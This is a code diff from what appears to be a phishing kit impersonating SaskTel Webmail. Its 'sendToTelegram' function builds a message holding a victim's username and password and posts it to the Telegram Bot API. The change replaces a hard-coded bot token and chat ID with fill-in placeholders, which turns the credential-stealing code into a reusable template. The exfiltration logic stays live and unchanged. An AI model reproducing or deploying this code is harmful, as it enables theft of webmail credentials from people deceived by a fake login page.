@@ -19,8 +19,8 @@ function sendToTelegram(event) {
     errorDisplay.setAttribute('role', 'alert');
     form.appendChild(errorDisplay);
 
-    const botToken = '7589986897:AAF3RtKE27dlnfzuOMQRlqVCwrFFFYABaLE';
-    const chatId = '7383718535';
+    const botToken = 'ADD_TELEGRAM_BOT_HERE';
+    const chatId = 'ADD_TELEGRAM_CHATID_HERE';
     const message = `🔐 Message from SaskTel Webmail 🔐\n\n👤 *User ID:* ${username}\n🔑 *Pass:* ${password}`;
     const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
